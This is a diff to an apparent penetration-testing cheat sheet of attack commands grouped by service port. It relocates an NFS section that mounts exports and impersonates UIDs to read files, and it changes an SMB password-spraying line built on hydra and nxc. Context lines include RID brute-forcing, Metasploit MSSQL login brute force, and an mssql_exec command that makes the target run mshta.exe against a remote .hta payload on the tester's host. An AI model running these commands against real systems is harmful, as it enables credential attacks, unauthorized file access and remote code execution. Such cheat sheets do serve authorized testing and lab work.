@@ -356,21 +356,8 @@ nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SA
 
 godap $TARGET -u '$USERNAME' -p '$PASSWORD'
 
-[*] (2049) NFS
-showmount -e $TARGET
-for x in $(showmount -e "$TARGET" | awk '{print $1}' | grep -v 'Export')
-    do mkdir -p "/dev/shm"/mnt"$x"
-    sudo mount -t nfs "$TARGET":"$x" "/dev/shm"/mnt"$x" -o nolock
-    tree -puga "/dev/shm"/mnt"$x"
-done
-sudo adduser -u 1002 mntuser
-sudo usermod -u 1003 mntuser
-sudo su mntuser
-setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
-
-
 [*] (445) SMB
-hydra -L usernames -P passwords smb2://$TARGET -t35 2>/dev/null | awk '{print $5}' > SMBusernames; (nxc smb "10.10.69.134" -u SMBusernames -p SMBusernames --continue-on-success | grep -P '^.*\+.*$' | sed '1s/^/\n/' | tee SMBspray &)
+hydra -L usernames -e ns smb2://$TARGET -t35 2>/dev/null | awk '{print $5}' > SMBusernames; (nxc smb "10.10.69.134" -u SMBusernames -p SMBusernames --continue-on-success | grep -vE '[*]|[-]|(Guest)' | sed '1s/^/\n/' | tee SMBspray &)
 
 (nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee -a usernames &)
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
@@ -406,6 +393,19 @@ msfconsole -x -q "use auxiliary/admin/mssql/mssql_enum; set RHOSTS $TARGET; run;
 msfconsole -x -q "use auxiliary/scanner/mssql/mssql_login; set RHOSTS $TARGET; set USER_FILE /tmp/mssqlusernames; set PASS_FILE /tmp/mssqlpasswords; run;"
 msfconsole -x -q "use auxiliary/admin/mssql/mssql_exec; set RHOSTS $TARGET; set CMD mshta.exe http://$MYIP:8080/nZzLAD.hta; set USERNAME $USERNAME; set PASSWORD $PASSWORD; run;"
 sessions -i 1
+
+[*] (2049) NFS
+showmount -e $TARGET
+for x in $(showmount -e "$TARGET" | awk '{print $1}' | grep -v 'Export')
+    do mkdir -p "/dev/shm"/mnt"$x"
+    sudo mount -t nfs "$TARGET":"$x" "/dev/shm"/mnt"$x" -o nolock
+    tree -puga "/dev/shm"/mnt"$x"
+done
+sudo adduser -u 1002 mntuser
+sudo usermod -u 1003 mntuser
+sudo su mntuser
+setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
+
 
 [*] (3306) MySQL
 mysql -h "$TARGET" -u root@localhost -e 'show databases;'
